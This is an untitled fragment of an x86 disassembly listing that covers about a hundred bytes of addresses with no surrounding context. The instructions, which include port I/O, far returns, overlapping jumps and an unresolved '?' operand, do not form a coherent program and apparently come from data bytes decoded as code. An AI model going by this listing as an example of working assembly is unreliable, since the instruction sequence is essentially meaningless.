  428585:	jae    0x4285e9
  428587:	test   eax,0xd3c2e6f
  42858c:	pop    eax
  42858d:	mov    ch,0xfb
  42858f:	mov    BYTE PTR fs:[ebx+0x5e],bh
  428593:	adc    edx,ebp
  428595:	nop
  428596:	mul    BYTE PTR [eax-0x13]
  428599:	adc    al,0xa5
  42859b:	inc    eax
  42859c:	imul   ebx,DWORD PTR [esi+0x5b],0x28df0c9c
  4285a3:	jl     0x4285a7
  4285a5:	push   es
  4285a6:	mov    ch,0x49
  4285a8:	push   cs
  4285a9:	xchg   ecx,eax
  4285aa:	sbb    edx,DWORD PTR [ebx+eiz*2]
  4285ad:	xchg   ebp,eax
  4285ae:	mov    al,cl
  4285b0:	rcl    DWORD PTR [ecx],0x63
  4285b3:	es mov ebx,0x7b743147
  4285b9:	sub    BYTE PTR [ebx],bh
  4285bb:	pushf  
  4285bc:	shl    BYTE PTR [eax+0x1f43f97a],0xe2
  4285c3:	or     BYTE PTR ds:[eax+0x2c4c57cc],al
  4285ca:	adc    al,0xf9
  4285cc:	push   esp
  4285cd:	in     al,0x59
  4285cf:	jae    0x42858a
  4285d1:	add    cl,ch
  4285d3:	dec    eax
  4285d4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4285d5:	imul   esi,DWORD PTR [ebx+0x9268fb],0xffffff93
  4285dc:	pop    ss
  4285dd:	xchg   dh,dl
  4285df:	pop    edi
  4285e0:	push   ecx
  4285e1:	ret    
  4285e2:	mov    al,ds:0x615c4f0f
  4285e7:	sahf   
  4285e8:	inc    ebx
  4285e9:	mov    WORD PTR [edx],es
  4285eb:	scas   al,BYTE PTR es:[edi]
  4285ec:	xchg   edi,eax
  4285ed:	add    BYTE PTR [eax],al
  4285ef:	add    BYTE PTR [eax],al
  4285f1:	add    BYTE PTR [edx],dl
  4285f3:	adc    BYTE PTR [eax-0x41c16dc2],0xac
  4285fa:	retf   0x4cd7
  4285fd:	ins    BYTE PTR es:[edi],dx
  4285fe:	out    0xd4,al
  428600:	stc    
  428601:	enter  0xfd6d,0x1
  428605:	add    BYTE PTR [eax+eax*1],bl
  428608:	add    BYTE PTR [eax],al
  42860a:	cmp    edx,esp
  42860c:	push   edx
  42860d:	and    BYTE PTR [ebx+0x52fb3cc],dh
  428613:	or     al,0xcb
  428615:	fstp   TBYTE PTR [esi-0x61]
  428618:	mov    ?,WORD PTR [ecx-0x4d]
  42861b:	loope  0x4285e2
  42861d:	add    al,0x5b
  42861f:	fcmovne st,st(1)
  428621:	out    dx,eax
  428622:	adc    DWORD PTR [ebx-0x78],eax
  428625:	or     DWORD PTR [eax],eax
	...
